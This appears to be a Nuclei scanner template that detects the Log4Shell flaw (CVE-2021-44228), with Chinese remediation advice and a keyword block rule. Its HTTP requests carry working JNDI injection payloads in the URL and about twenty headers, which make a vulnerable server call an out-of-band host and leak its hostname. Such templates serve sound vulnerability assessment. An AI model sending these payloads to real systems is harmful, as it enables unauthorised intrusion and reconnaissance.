id: CVE-2021-44228
info:
  name: Apache Log4j2 Remote Code Injection
  author:
  - l0ne1y
  description: |-
    Apache Log4j2 远程代码执行漏洞
    Apache Log4j是美国阿帕奇（Apache）基金会的一款基于Java的开源日志记录工具。

    Apache Log4J 存在代码问题漏洞，攻击者可设计一个数据请求发送给使用 Apache Log4j工具的服务器，当该请求被打印成日志时就会触发远程代码执行。
  severity: critical
  remediation: |-
    **官方修复方案**
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://logging.apache.org/log4j/2.x/security.html

    **临时修复方案**
    1.建议JDK使用6u211、7u201、8u191、11.0.1及以上的版本;
    2.添加jvm启动参数:-Dlog4j2.formatMsgNoLookups=true;
    3.添加log4j2.component.properties配置文件，增加如下内容为：
    log4j2.formatMsgNoLookups=true;
    4.系统环境变量中将FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS设置为true;
    5.禁止安装log4j的服务器访问外网，并在边界对dnslog相关域名访问进行检测。
    6.凡检测到包含“${jndi:ldap:”的关键字，直接阻断访问流量
    7.使用如下官方临时补丁进行修复https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1
    8.在攻击过程中可能使用 DNSLog 进行漏洞探测，建议可以通过流量监测设备监控是否有相关 DNSLog 域名的请求。
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
  extractors:
  - type: kval
    kval:
    - interactsh_ip
  - type: regex
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    group: 2
    part: interactsh_request
  - type: regex
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    group: 1
    part: interactsh_request
  matchers-condition: and
  raw:
  - |
    GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
    Host: {{Hostname}}
  - |
    GET / HTTP/1.1
    Host: {{Hostname}}
    Accept: ${jndi:ldap://${hostName}.accept.{{interactsh-url}}}
    Accept-Encoding: ${jndi:ldap://${hostName}.acceptencoding.{{interactsh-url}}}
    Accept-Language: ${jndi:ldap://${hostName}.acceptlanguage.{{interactsh-url}}}
    Access-Control-Request-Headers: ${jndi:ldap://${hostName}.accesscontrolrequestheaders.{{interactsh-url}}}
    Access-Control-Request-Method: ${jndi:ldap://${hostName}.accesscontrolrequestmethod.{{interactsh-url}}}
    Authentication: Basic ${jndi:ldap://${hostName}.authenticationbasic.{{interactsh-url}}}
    Authentication: Bearer ${jndi:ldap://${hostName}.authenticationbearer.{{interactsh-url}}}
    Cookie: ${jndi:ldap://${hostName}.cookiename.{{interactsh-url}}}=${jndi:ldap://${hostName}.cookievalue.{{interactsh-url}}}
    Location: ${jndi:ldap://${hostName}.location.{{interactsh-url}}}
    Origin: ${jndi:ldap://${hostName}.origin.{{interactsh-url}}}
    Referer: ${jndi:ldap://${hostName}.referer.{{interactsh-url}}}
    Upgrade-Insecure-Requests: ${jndi:ldap://${hostName}.upgradeinsecurerequests.{{interactsh-url}}}
    User-Agent: ${jndi:ldap://${hostName}.useragent.{{interactsh-url}}}
    X-Api-Version: ${jndi:ldap://${hostName}.xapiversion.{{interactsh-url}}}
    X-CSRF-Token: ${jndi:ldap://${hostName}.xcsrftoken.{{interactsh-url}}}
    X-Druid-Comment: ${jndi:ldap://${hostName}.xdruidcomment.{{interactsh-url}}}
    X-Forwarded-For: ${jndi:ldap://${hostName}.xforwardedfor.{{interactsh-url}}}
    X-Origin: ${jndi:ldap://${hostName}.xorigin.{{interactsh-url}}}
  stop-at-first-match: true
